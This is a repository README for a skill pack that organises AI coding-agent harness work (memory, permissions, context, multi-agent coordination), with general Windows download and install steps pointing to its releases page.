# 🧩 agentic-harness-patterns-skill - Organize agent work with less friction

[![Download](https://img.shields.io/badge/Download%20Latest-blue-grey?style=for-the-badge)](https://github.com/dinho-afsn/agentic-harness-patterns-skill/releases)

## 📦 What this is

agentic-harness-patterns-skill is a skill pack for harness engineering. It helps you set up memory, permissions, context, and multi-agent work in a clear way.

It is built from Claude Code patterns and is meant to help with daily agent workflows. It also maps well to Codex CLI and Gemini CLI use cases.

This skill is useful if you want to:

- keep agent context in one place
- set rules for what an agent can do
- split work across more than one agent
- reduce repeated setup steps
- keep harness work more consistent

## 🖥️ System needs

Use this on a Windows PC with:

- Windows 10 or Windows 11
- A modern web browser
- A stable internet connection
- Node.js installed if you plan to use `npx skills add`
- Enough free space to store the skill files

If you use Claude Code, Codex CLI, or Gemini CLI, this skill can fit into that setup.

## 🚀 Download and install

1. Open the release page: https://github.com/dinho-afsn/agentic-harness-patterns-skill/releases
2. Find the latest release at the top of the page
3. Download the release file or package from that page
4. Save the file to a folder you can find again, مثل `Downloads`
5. If the release includes an install step, follow the file name or release notes on the page
6. If you use the `npx skills add` flow, run the install command from your shell after you have Node.js set up

If your release contains a package file, you can keep it in the folder you use for your other skills. If it is an install-ready archive, open it and follow the included steps.

## 🧰 How to use it

After install, the skill helps you shape agent work in a few core areas:

### 🧠 Memory

Use memory to store key facts that the agent should keep across tasks.

Common uses:

- project rules
- user preferences
- known task steps
- names of files or folders
- past decisions

This keeps the agent from asking the same things again.

### 🔐 Permissions

Use permissions to control what the agent can change.

Common uses:

- read-only tasks
- write access for specific folders
- approval for risky steps
- limits on file edits
- rules for commands that touch the system

This helps keep work safe and clear.

### 🧭 Context engineering

Use context engineering to give the agent the right input before work starts.

Common uses:

- task goals
- background notes
- file paths
- expected output
- examples of the result you want

Good context helps the agent stay on track.

### 🤝 Multi-agent coordination

Use multi-agent coordination when one agent should not do everything alone.

Common uses:

- one agent plans
- one agent writes
- one agent checks
- one agent compares results
- one agent tracks shared state

This works well for larger tasks and for repeatable workflows.

## 🪄 Suggested setup flow

If you are new to this kind of tool, use this simple path:

1. Download the release from the link above
2. Install the skill with your preferred setup flow
3. Open your agent tool
4. Load the skill in the place where your tool keeps skills or instructions
5. Start with a small task
6. Add memory rules, permission rules, and context notes as needed

A small first task helps you see how the skill affects the agent before you use it on a larger job.

## 🧩 What you can do with it

This skill fits tasks like:

- setting up repeatable agent workflows
- building rules for tool use
- managing project context
- organizing prompt inputs
- splitting one task across several agents
- keeping harness rules in one place
- preparing a CLI agent for a project

It can also help when you switch between tools and want the same work pattern in each one.

## 🔎 Included focus areas

This repository centers on:

- agent workflows
- Claude Code patterns
- Codex CLI support
- Gemini CLI support
- harness engineering
- skills-based setup
- English and Chinese use

The goal is to make agent setup easier to reuse across tools and teams.

## 📝 Simple usage example

A basic setup may look like this:

- You tell the agent the task
- You set the files it may touch
- You give it the project context
- You choose one agent to plan the work
- You choose one agent to carry it out
- You keep memory notes for the next run

This kind of flow works well when you want fewer handoffs and less repeated setup.

## 🌍 Language support

This skill includes EN and ZH support.

That can help if you work in English or Chinese, or if your team uses both.

## 🧭 Where this fits

Use this repository if you want a clearer way to manage agent behavior in:

- local CLI tools
- harness setups
- shared project rules
- task memory
- controlled edits
- multi-step work

It is a good match for users who want structure without extra steps.

## ❓ Common questions

### Do I need coding knowledge?

No. You can start by downloading the release and following the install steps on the release page.

### Can I use it on Windows?

Yes. The main flow is built for Windows users who want to download and run the skill in their agent setup.

### Does it work with more than one agent tool?

Yes. The roadmap includes Codex CLI and Gemini CLI, and the skill is built around patterns that work across agent tools.

### Can I use it with Claude Code?

Yes. The skill was distilled from Claude Code patterns, so it fits that workflow well.

## 📁 Repository topics

This project is tagged with:

- agent
- claude-code
- codex
- contexts
- gemini-cli
- harness-engineering
- skills

These topics match the main use case: managing agent work in a clear, repeatable way

## 🛠️ Install with npx skills add

If your setup uses `npx skills add`, use that path after you have Node.js ready on Windows.

Typical flow:

1. Open Command Prompt or PowerShell
2. Make sure Node.js is installed
3. Run the `npx skills add` command for this skill
4. Follow the prompts from your tool
5. Load the skill in your agent workflow

If your tool asks for a local path or a package source, use the release you downloaded from the link above

## 📌 Release page

Visit this page to download the latest release and get the current package:

https://github.com/dinho-afsn/agentic-harness-patterns-skill/releases